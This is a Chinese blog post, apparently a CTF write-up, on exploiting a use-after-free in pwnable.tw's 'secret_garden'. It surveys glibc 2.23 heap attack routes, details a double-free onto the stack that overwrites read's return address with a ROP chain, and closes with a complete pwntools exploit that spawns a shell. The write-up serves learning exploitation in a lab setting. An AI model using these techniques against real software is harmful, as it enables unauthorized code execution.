---
layout: post
title:  "2019.5.12 记一次利用堆漏洞攻击栈"
tags: [ROP, stack, heap, UAF]
date: 2019-05-12
comments: false
---

## Use Heap Vuln to Attack Stack.

这几天参加某**行动，酒店里呆着属实无聊，就刷刷pwnable.tw。刷到一个题，secret_gadren.

在hitconlab里做过一个名字相同的，但这个比那个会难一点。

checksec:

![5cd82d1bd81c0](https://i.loli.net/2019/05/12/5cd82d1bd81c0.png)

简单看一下,一个note题，

结构为：

```
flower{
    flowerhead   此chunk大小为0x28
    {
        p64(0)  0或1，用来标记flowername是否被释放
        p64(*flowername)  指向flowername的指针
        'xxxxxxx'  flower的color，由用户输入，最长为23字节。
    }
    flowername   此chunk大小由用户输入的size决定
    {
        'xxxxxxxxxxxx' flower的name，由用户输入。
    }
}
```

漏洞点在删除功能中，只将header中的标志位清0，未将ptr中指针清0

![5cd82dcb53827](https://i.loli.net/2019/05/12/5cd82dcb53827.png)

题目给的libc版本为2.23，这题解题方法其实很多。

1. malloc_hook : 通过unsorted bin泄露libc,double free在malloc_hook上方建立chunk，覆写malloc_hook为one_gadget。通过malloc或者malloc_printerr触发。

2. realloc_hook : 有时one_gadget可能会因为栈数据不满足要求而无法正常执行,这种方法可以调整栈帧。malloc_hook与realloc_hook相邻。通过unsorted bin泄露libc,double free在malloc_hook上方建立chunk，将malloc_hook改成realloc函数中的某个地址，再将realloc_hook设置为one_gadget地址：

   ![5cd832ae4d2c7](https://i.loli.net/2019/05/12/5cd832ae4d2c7.png)

   可以看到realloc函数中，在调用_\_realloc_hook之前有几个压栈操作，可以控制malloc_hook跳到上面来压低栈帧从而使得环境符合要求。

3. free_hook : 通过unsorted bin泄露libc，建立一个新fastbin chunk再将其free掉，此时main_arena中的fastbinsY中便会记录这个堆块的地址。同时fastbinsY地址可知，因此可以利用chunk的最高字节错位，double free在main_arena上建立chunk，将topchunk指针覆盖为freehook上方某个地址(freehook - 0xb58)，再不断malloc直到分配到freehook，覆盖freehook为system地址。free掉一个内容为/bin/sh的chunk即可。

4. stdout : 通过unsorted bin泄露libc，double free在__IO\_2_1\_stdout_上建立chunk，将one\_gadget写入其中某处(一般为__IO_FILE结构最后_unused2部分)，并覆盖vtable指向one\_gadget-0x38(xsputn在vtable中的offset)。下次调用printf时便会触发one_gadget。

5. ROP : 通过unsorted bin泄露libc，通过uaf泄露stack，手动调试查看在添加chunk过程中，malloc时取fastbin时的栈情况，read函数中即将返回时的栈情况。通过以上两个信息，可以利用double_free在stack上面建立chunk，覆盖掉read完成后的返回地址为ROP即可，这种方法不需要考虑canary，如下图:

   ![5cd83ac295628](https://i.loli.net/2019/05/12/5cd83ac295628.png)

   read函数正常执行完成的话，直接在0xf6688处ret，可见并未检查canary。

## 下面主要说一下第5种方法的一些操作。

1.泄露stack : uaf这个很简单，通过double free布局，让一个chunk A的内容部分成为chunk B的header，控制chunk A的内容为想要读的指针，再读chunk B的内容即可。这里通过读`environ`来获取栈地址。`environ`中保存了一个栈指针，这个栈指针又指向环境变量的地址。(相见 : [environ](https://www.gnu.org/software/libc/manual/html_node/Environment-Access.html))

也可以调试一下：

![5cd83d9bab3ea](https://i.loli.net/2019/05/12/5cd83d9bab3ea.png)

![5cd83da9366c4](https://i.loli.net/2019/05/12/5cd83da9366c4.png)

![5cd83db0049a6](https://i.loli.net/2019/05/12/5cd83db0049a6.png)

![5cd83db0049a1](https://s2.ax1x.com/2019/05/14/EociSs.png)





2.这里先查看read函数中将要ret时的栈布局，先控制断点在read上。

![5cd83f5b39215](https://i.loli.net/2019/05/12/5cd83f5b39215.png)

![5cd83f87ee9e2](https://i.loli.net/2019/05/12/5cd83f87ee9e2.png)

attach之后按c断下后单步步入read，再单步步过至ret即可。

![5cd8403cb093b](https://i.loli.net/2019/05/12/5cd8403cb093b.png)

记录此时栈顶`0x7ffd3a4c2248`与泄露栈地址`0x7ffd3a4c2398`的offset1=0x150。

3.再看malloc从fastbin取指针并分配chunk时栈的布局，这里只需用double free让fastbin中的指针为一个不存在的地址，继续分配下去会crash，查看crash时的内存布局即可。

![5cd8414f3e2c0](https://i.loli.net/2019/05/12/5cd8414f3e2c0.png)

![5cd84178b9c4f](https://i.loli.net/2019/05/12/5cd84178b9c4f.png)

可以看到已经存在bad memory，接下来手动添加一个0x60大小的chunk触发异常。

![5cd841c98e3ff](https://i.loli.net/2019/05/12/5cd841c98e3ff.png)

根据offset1，查看下面read函数中ret时的栈在此时的布局，在上方适当位置找0x7f利用字节偏移建立chunk。

![5cd842b7ebc2c](https://i.loli.net/2019/05/12/5cd842b7ebc2c.png)

`0x7ffe6c05c1b8`即返回地址，查看上方布局。

![5cd8435ee833f](https://i.loli.net/2019/05/13/5cd8435ee833f.png)

可以看到`0x7ffe6c05c178`处`0x00007ffe6c05c2f0`的0x7f后面的高位字节都为`\x00`，可以用来错位。

错位之后：

![5cd843d335173](https://s2.ax1x.com/2019/05/14/EocZwT.png)

得到fakechunk的addr为`0x7ffe6c05c17d`，输入的数据从`0x7ffe6c05c18d`开始储存，现在计算输入地址与目标返回地址的偏移。

![5cd8443561147](https://i.loli.net/2019/05/13/5cd8443561147.png)

这样就已经得到所有需要条件。只需double free，在fakechunk上建立0x60大小的chunk，再填充padding = 0x2b个字节，再使用ROP覆盖返回地址即可。

![5cd844dbb4f04](https://i.loli.net/2019/05/13/5cd844dbb4f04.png)

getshell:

![5cd845e93a37a](https://i.loli.net/2019/05/13/5cd845e93a37a.png)

完整exp如下：

```python
#!/usr/bin/env python
# -*- coding=utf8 -*-
"""
# Author: le3d1ng
# Created Time : 2019年05月10日 星期五 21时36分37秒
# File Name: exp.py
# Description:
"""
from pwn import *

io = process('./secretgarden')# , env = {'LD_PRELOAD':'./libc_64.so.6'})
codebase = io.libs()['/home/leeding/pwnable.tw/secret_garden/secretgarden']
#io = remote('chall.pwnable.tw', 10203)
#libc = ELF('./libc_64.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#context.log_level = 'debug'
context.terminal = ['terminator', '-x' , 'sh' , '-c']


def debug():
    gdb.attach(io)
    io.interactive()

def raisef(length,name,color):
    io.sendlineafter(': ','1')
    io.sendlineafter(' :',str(length))
    io.sendlineafter(' :',name)
    io.sendlineafter(' :',color)

def visit():
    io.sendlineafter(": ",'2')

def removeg(idx):
    io.sendlineafter(': ','3')
    io.sendlineafter(':',str(idx))

def cleang():
    io.sendlineafter(': ','4')

#leaklibc
raisef(0x80,'a','a')#0
raisef(0x60,'b','b')#1
raisef(0x60,'c','c')#2
raisef(0x60,'d','d')#3
raisef(0x60,'e','e')#4
removeg(0)
raisef(0x50,'11111112','4')#5
visit()
io.recvuntil('11112')
libcbase = u64(io.recv(6).ljust(8,'\x00')) - 0x3c4b0a
success('libcbase : '+ hex(libcbase))
poprdiret = 0x0000000000021102+libcbase
sysaddr = libcbase + libc.symbols['system']
binshaddr = libcbase + libc.search('/bin/sh').next()
environ = libcbase + libc.symbols['environ']
success('environ : '+hex(environ))
#debug()
raisef(0x28,'6','6')
raisef(0x28,'7','7')
raisef(0x28,'8','8')
raisef(0x28,'9','9')
raisef(0x28,'10','10')
raisef(0x28,'11','11')
raisef(0x28,'12','12')
raisef(0x28,'13','13')
raisef(0x28,'14','14')


#uaf leak stack
removeg(6)
removeg(7)
removeg(8)
removeg(6)

raisef(0x28,'15','15') #15
raisef(0x28,p64(1)+p64(environ),'16')

visit()
io.recvuntil('flower[15] :')
leakstack = u64(io.recv(6).ljust(8,'\x00'))
fakechunk = leakstack - 0x18b#+8
canaryaddr = leakstack-0x110
pad = 0x5b
success('leakstack : '+hex(leakstack))
success('canaryaddr : '+hex(canaryaddr))
success('fakechunk : '+hex(fakechunk))
success('fakechunkinputaddr : '+hex(fakechunk+0x10))
#removeg(16)
#debug()
removeg(13)
removeg(14)


#uaf leak canary , actually useless
removeg(10)
removeg(11)
removeg(12)
removeg(10)

raisef(0x28,'17','17') #17
raisef(0x28,p64(1)+p64(canaryaddr+1),'18')
visit()
io.recvuntil('wer[17] :')
canary = u64(io.recv(7).rjust(8,'\x00'))
success('canary : '+hex(canary))
success('read ret : '+hex(leakstack -0x150))
cleang()



#double free attack stack
raisef(0x60,'17','17')#0
raisef(0x60,'18','18')#6
raisef(0x60,'19','19')#7
raisef(0x60,'20','20')#8

removeg(0)
removeg(6)
removeg(0)
#debug()
raisef(0x60,p64(fakechunk),'21')
#gdb.attach(io,'b *'+str(codebase+0xd18))
raisef(0x60,'22','22')
raisef(0x60,'23','23')

rop = p64(poprdiret)  +p64(binshaddr) + p64(sysaddr)
pay = 'a'*(0x2b)+rop
io.sendlineafter(': ','1')
io.sendlineafter(' :',str(0x60))
io.sendlineafter(' :',pay)

#debug()
io.interactive()
exit()
```

本来想的是泄露canary，覆盖整个添加chunk功能的返回地址，但意外发现read函数的存放返回地址的位置也在其存放返回地址的位置附近，导致read不能正常返回。然后想到直接覆盖read的返回地址就好了。

这种方法是第一次遇到，记录一下。
